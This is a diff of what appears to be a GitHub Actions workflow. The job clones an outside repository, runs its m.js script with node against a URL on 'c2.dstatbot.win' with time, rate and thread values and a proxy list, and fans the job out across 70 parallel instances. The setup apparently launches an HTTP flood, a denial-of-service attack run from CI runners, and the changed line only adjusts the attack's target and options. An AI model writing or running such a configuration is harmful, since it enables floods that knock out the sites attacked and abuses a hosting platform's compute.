@@ -44,7 +44,7 @@ jobs:
           git clone https://github.com/Ggeg111/curly-octo-doodle.git
           mv curly-octo-doodle/m.js op.js
           
-          node op.js GET https://c2.dstatbot.win/P6f3oPnY 700 4 90 proxy.txt  --bfm --debug 
+          node op.js https://c2.dstatbot.win/RnDESW05 700 4 90 proxy.txt ipv4 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
